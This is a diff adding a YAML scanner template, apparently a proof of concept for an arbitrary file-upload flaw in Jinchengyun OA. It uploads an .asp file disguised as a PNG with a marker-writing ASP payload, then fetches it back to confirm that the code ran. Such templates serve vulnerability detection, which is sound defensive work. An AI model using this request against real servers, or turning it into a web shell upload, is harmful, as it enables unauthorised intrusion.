@@ -1,0 +1,41 @@
+name: poc-yaml-jinchengyunOA-AttachFile_UploadFile-File-upload
+transport: http
+
+
+set:
+  username: randomLowercase(6)
+  randbody: base64Decode("cGJveWpubnJmaXBtcGxzdWtkZWN6dWRzZWZ4bXl3ZQ==")
+  rboundary: randomLowercase(8)
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /OA/api/2.0/Common/AttachFile/UploadFile
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+        Content-Type: multipart/form-data; boundary=d0b7a0d40eed0e32904c{{rboundary}}
+      body: 
+       "--d0b7a0d40eed0e32904c{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"upload\"; filename=\"{{username}}.asp\"\r\n\
+        Content-Type: image/png\r\n\
+        \r\n\
+        <% Response.Write(\"{{randbody}}\") %>\r\n\
+        --d0b7a0d40eed0e32904c{{rboundary}}--\r\n\
+        "
+    expression: response.status == 200
+    output:
+      search: '"fileTargetName\":\"(?P<uploadfile>[a-zA-Z0-9-]+\\.asp)".bsubmatch(response.body)'
+      uploadfile: search["uploadfile"]
+
+  r1:
+    request:
+      method: GET
+      path: /OA/upfiles/temp/{{uploadfile}}
+    expression: response.status == 200 && response.body.bcontains(bytes(randbody))
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486750&idx=1&sn=8ffac414cd3f1a03a1e3a24c40a73de1&chksm=c267b82df510313be211165c5726441b412112e0c7de127b128a394ed2267f351493ee235c1c&token=522460222&lang=zh_CN#rd
